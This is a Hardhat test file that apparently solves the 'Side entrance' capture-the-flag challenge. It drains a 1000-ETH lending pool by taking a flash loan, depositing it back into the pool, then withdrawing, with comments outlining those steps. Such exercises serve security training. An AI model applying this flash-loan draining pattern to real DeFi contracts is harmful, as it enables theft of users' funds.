const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Side entrance", function () {
    let deployer, attacker

    const ETHER_IN_POOL = ethers.utils.parseEther("1000")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, attacker] = await ethers.getSigners()

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory(
            "SideEntranceLenderPool",
            deployer
        )
        this.pool = await SideEntranceLenderPoolFactory.deploy()

        await this.pool.deposit({ value: ETHER_IN_POOL })

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address)

        expect(await ethers.provider.getBalance(this.pool.address)).to.equal(ETHER_IN_POOL)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        //flashloan
        //1. flashloan
        //   1.a deposit
        //2. withdraw

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory(
            "SideEntranceLenderPool",
            attacker
        )
        pool = await SideEntranceLenderPoolFactory.attach(this.pool.address)

        console.log(
            "\t Attacker's Balance:",
            (await ethers.provider.getBalance(attacker.address)).toString()
        )

        console.log(
            "\t Pool's Balance:",
            (await ethers.provider.getBalance(pool.address)).toString()
        )

        const sideHustleFactory = await ethers.getContractFactory(
            "FlashLoanEtherReceiver",
            attacker
        )
        sideHustle = await sideHustleFactory.deploy(pool.address, attacker.address)

        await sideHustle.callFlashLoan()
        await sideHustle.withdrawFromPool()

        console.log(
            "\t Attacker's Balance:",
            (await ethers.provider.getBalance(attacker.address)).toString()
        )

        console.log(
            "\t Pool's Balance:",
            (await ethers.provider.getBalance(pool.address)).toString()
        )
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal("0")

        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
            this.attackerInitialEthBalance
        )
    })
})
